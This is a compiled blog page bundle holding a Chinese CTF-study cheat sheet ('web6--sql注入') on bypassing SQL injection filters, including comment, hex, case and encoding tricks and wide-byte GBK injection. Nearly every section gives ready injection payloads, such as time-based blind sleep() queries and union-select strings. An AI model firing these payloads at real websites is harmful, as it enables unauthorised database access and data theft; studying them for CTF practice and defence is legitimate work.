import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as i,b as a,o as n}from"./app-BO1dOw6z.js";const l={};function t(r,e){return n(),i("div",null,e[0]||(e[0]=[a(`<h2 id="_1-绕过空格-注释符-a0" tabindex="-1"><a class="header-anchor" href="#_1-绕过空格-注释符-a0"><span>1.绕过空格<code>（注释符/* */，%a0）</code>：</span></a></h2><p>两个空格代替一个空格，用Tab代替空格，%a0=空格：\`</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>最基本的绕过方法，用注释替换空格</p><h2 id="_2-括号绕过空格" tabindex="-1"><a class="header-anchor" href="#_2-括号绕过空格"><span>2.括号绕过空格：</span></a></h2><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p><p>在MySQL中，括号是用来包围<a href="https://so.csdn.net/so/search?q=%E5%AD%90%E6%9F%A5%E8%AF%A2&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreferrer">子查询</a>的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>select(user())from dual where(1=1)and(2=2)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>这种过滤方法常常用于<a href="https://so.csdn.net/so/search?q=time&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreferrer">time</a> based盲注,例如：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="_3-引号绕过-使用十六进制" tabindex="-1"><a class="header-anchor" href="#_3-引号绕过-使用十六进制"><span>3.引号绕过（使用十六进制）：</span></a></h2><p>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>select column_name  from information_schema.tables where table_name=&quot;users&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。<br> 　　users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>select column_name  from information_schema.tables where table_name=0x7573657273</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="_4-逗号绕过-使用from或者offset" tabindex="-1"><a class="header-anchor" href="#_4-逗号绕过-使用from或者offset"><span>4.逗号绕过（使用from或者offset）：</span></a></h2><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>select substr(database() from 1 for 1);</span></span>
<span class="line"><span>select mid(database() from 1 for 1);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>使用join：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>union select 1,2     #等价于</span></span>
<span class="line"><span>union select * from (select 1)a join (select 2)b</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>使用like：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>select ascii(mid(user(),1,1))=80   #等价于</span></span>
<span class="line"><span>select user() like &#39;r%&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>对于limit可以使用offset来绕过：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>select * from news limit 0,1</span></span>
<span class="line"><span># 等价于下面这条SQL语句</span></span>
<span class="line"><span>select * from news limit 1 offset 0</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_5-比较符号-绕过" tabindex="-1"><a class="header-anchor" href="#_5-比较符号-绕过"><span>5.比较符号（&lt;&gt;）绕过</span></a></h2><p>过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本：<br> 使用greatest()、least（）：（前者返回最大值，后者返回最小值）<br> 　　同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。<br> 　　最常见的一个盲注的sql语句：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。<br> 　　那么上面的这条sql语句可以使用greatest变为如下的子句:</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="使用between-and" tabindex="-1"><a class="header-anchor" href="#使用between-and"><span>使用between and：</span></a></h3><p>between a and b：</p><p>between 1 and 1; 等价于 =1</p><h2 id="_6-or-and-xor-not绕过" tabindex="-1"><a class="header-anchor" href="#_6-or-and-xor-not绕过"><span>6.or and xor not绕过：</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span></span></span>
<span class="line"><span>and=&amp;&amp;  or=||   xor=|   not=!</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_7-绕过注释符号-后面跟一个空格-过滤" tabindex="-1"><a class="header-anchor" href="#_7-绕过注释符号-后面跟一个空格-过滤"><span>7.绕过注释符号（#，--(后面跟一个空格））过滤：</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>id=1&#39; union select 1,2,3||&#39;1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>最后的or &#39;1闭合查询语句的最后的单引号，或者：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>id=1&#39; union select 1,2,&#39;3</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="_8-绕过" tabindex="-1"><a class="header-anchor" href="#_8-绕过"><span>8.=绕过：</span></a></h2><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p><h2 id="_9-绕过union-select-where等" tabindex="-1"><a class="header-anchor" href="#_9-绕过union-select-where等"><span>9.绕过union，select，where等：</span></a></h2><p>（1）使用注释符绕过：<br> 　　常用注释符：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>//，-- , /**/, #, --+, -- -, ;,%00,--a</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>用法：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>（2）使用大小写绕过：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>id=-1&#39;UnIoN/**/SeLeCT</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>（3）内联注释绕过：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>id=-1&#39;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>id=-1&#39;UNIunionONSeLselectECT1,2,3–-</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="_10-通用绕过-编码" tabindex="-1"><a class="header-anchor" href="#_10-通用绕过-编码"><span>10.通用绕过（编码）：</span></a></h2><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="_11-等价函数绕过" tabindex="-1"><a class="header-anchor" href="#_11-等价函数绕过"><span>11.等价函数绕过：</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>hex()、bin() ==&gt; ascii()</span></span>
<span class="line"><span></span></span>
<span class="line"><span>sleep() ==&gt;benchmark()</span></span>
<span class="line"><span></span></span>
<span class="line"><span>concat_ws()==&gt;group_concat()</span></span>
<span class="line"><span></span></span>
<span class="line"><span>mid()、substr() ==&gt; substring()</span></span>
<span class="line"><span></span></span>
<span class="line"><span>@@user ==&gt; user()</span></span>
<span class="line"><span></span></span>
<span class="line"><span>@@datadir ==&gt; datadir()</span></span>
<span class="line"><span></span></span>
<span class="line"><span>举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　</span></span>
<span class="line"><span></span></span>
<span class="line"><span>或者：</span></span>
<span class="line"><span>substr((select &#39;password&#39;),1,1) = 0x70</span></span>
<span class="line"><span>strcmp(left(&#39;password&#39;,1), 0x69) = 1</span></span>
<span class="line"><span>strcmp(left(&#39;password&#39;,1), 0x70) = 0</span></span>
<span class="line"><span>strcmp(left(&#39;password&#39;,1), 0x71) = -1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_12-宽字节注入" tabindex="-1"><a class="header-anchor" href="#_12-宽字节注入"><span>12.宽字节注入：</span></a></h2><p>过滤 &#39; 的时候往往利用的思路是将 &#39; 转换为 &#39; 。</p><p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p><p>（1）%df 吃掉 \\ 具体的方法是 urlencode(&#39;) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（&#39;）符号在外面：</p><p>id=-1%df%27union select 1,user(),3--+<br> 　　（2）将 &#39; 中的 \\ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p><p>一般产生宽字节注入的PHP函数：<br> 1.replace（）：过滤 &#39; \\ ，将 &#39; 转化为 &#39; ，将 \\ 转为 \\，将 &quot; 转为 &quot; 。用思路一。</p><p>2.addslaches()：返回在预定义字符之前添加反斜杠（\\）的字符串。预定义字符：&#39; , &quot; , \\ 。用思路一</p><p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p><p>3.mysql_real_escape_string()：转义下列字符：</p><p>\\x00 \\n \\r \\ &#39; &quot; \\x1a<br> （防御，将mysql设置为gbk即可）</p><p>PCRE绕过：<br> union/*&#39;+&#39;a&#39;<em>1000001+&#39;</em>/select</p><p>参考链接：<a href="https://blog.csdn.net/Cairo_A/article/details/134882367" target="_blank" rel="noopener noreferrer">【网络安全】SQL注入绕过技巧--CSDN</a></p>`,68)]))}const p=s(l,[["render",t],["__file","web6--sql注入.html.vue"]]),c=JSON.parse('{"path":"/article/01_%E9%A1%B9%E7%9B%AE/ctfshow/web6--sql%E6%B3%A8%E5%85%A5.html","title":"web6--sql注入","lang":"zh-CN","frontmatter":{"icon":"pen-to-square","date":"2025-04-30T00:00:00.000Z","tags":null,"title":"web6--sql注入","category":["项目"],"description":"1.绕过空格（注释符/* */，%a0）： 两个空格代替一个空格，用Tab代替空格，%a0=空格：` 最基本的绕过方法，用注释替换空格 2.括号绕过空格： 如果空格被过滤，括号没有被过滤，可以用括号绕过。 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。 这种过滤方法常常用...","head":[["meta",{"property":"og:url","content":"https://github.com/fakeppa/fakeppa.github.io/article/01_%E9%A1%B9%E7%9B%AE/ctfshow/web6--sql%E6%B3%A8%E5%85%A5.html"}],["meta",{"property":"og:site_name","content":"问己"}],["meta",{"property":"og:title","content":"web6--sql注入"}],["meta",{"property":"og:description","content":"1.绕过空格（注释符/* */，%a0）： 两个空格代替一个空格，用Tab代替空格，%a0=空格：` 最基本的绕过方法，用注释替换空格 2.括号绕过空格： 如果空格被过滤，括号没有被过滤，可以用括号绕过。 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。 这种过滤方法常常用..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-06-13T09:12:02.000Z"}],["meta",{"property":"article:published_time","content":"2025-04-30T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-06-13T09:12:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"web6--sql注入\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2025-04-30T00:00:00.000Z\\",\\"dateModified\\":\\"2025-06-13T09:12:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"fakeppa\\",\\"url\\":\\"https://github.com/fakeppa/fakeppa.github.io\\"}]}"]]},"headers":[{"level":2,"title":"1.绕过空格（注释符/* */，%a0）：","slug":"_1-绕过空格-注释符-a0","link":"#_1-绕过空格-注释符-a0","children":[]},{"level":2,"title":"2.括号绕过空格：","slug":"_2-括号绕过空格","link":"#_2-括号绕过空格","children":[]},{"level":2,"title":"3.引号绕过（使用十六进制）：","slug":"_3-引号绕过-使用十六进制","link":"#_3-引号绕过-使用十六进制","children":[]},{"level":2,"title":"4.逗号绕过（使用from或者offset）：","slug":"_4-逗号绕过-使用from或者offset","link":"#_4-逗号绕过-使用from或者offset","children":[]},{"level":2,"title":"5.比较符号（<>）绕过","slug":"_5-比较符号-绕过","link":"#_5-比较符号-绕过","children":[{"level":3,"title":"使用between and：","slug":"使用between-and","link":"#使用between-and","children":[]}]},{"level":2,"title":"6.or and xor not绕过：","slug":"_6-or-and-xor-not绕过","link":"#_6-or-and-xor-not绕过","children":[]},{"level":2,"title":"7.绕过注释符号（#，--(后面跟一个空格））过滤：","slug":"_7-绕过注释符号-后面跟一个空格-过滤","link":"#_7-绕过注释符号-后面跟一个空格-过滤","children":[]},{"level":2,"title":"8.=绕过：","slug":"_8-绕过","link":"#_8-绕过","children":[]},{"level":2,"title":"9.绕过union，select，where等：","slug":"_9-绕过union-select-where等","link":"#_9-绕过union-select-where等","children":[]},{"level":2,"title":"10.通用绕过（编码）：","slug":"_10-通用绕过-编码","link":"#_10-通用绕过-编码","children":[]},{"level":2,"title":"11.等价函数绕过：","slug":"_11-等价函数绕过","link":"#_11-等价函数绕过","children":[]},{"level":2,"title":"12.宽字节注入：","slug":"_12-宽字节注入","link":"#_12-宽字节注入","children":[]}],"git":{"createdTime":1746002566000,"updatedTime":1749805922000,"contributors":[{"name":"fakeppa","username":"fakeppa","email":"l17091799155@qq.com","commits":155,"url":"https://github.com/fakeppa"}]},"readingTime":{"minutes":4.48,"words":1344},"filePathRelative":"article/01_项目/ctfshow/web6--sql注入.md","localizedDate":"2025年4月30日","excerpt":"<h2>1.绕过空格<code>（注释符/* */，%a0）</code>：</h2>\\n<p>两个空格代替一个空格，用Tab代替空格，%a0=空格：`</p>\\n<div class=\\"language- line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"\\" data-title=\\"\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span>%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div></div></div>","autoDesc":true}');export{p as comp,c as data};
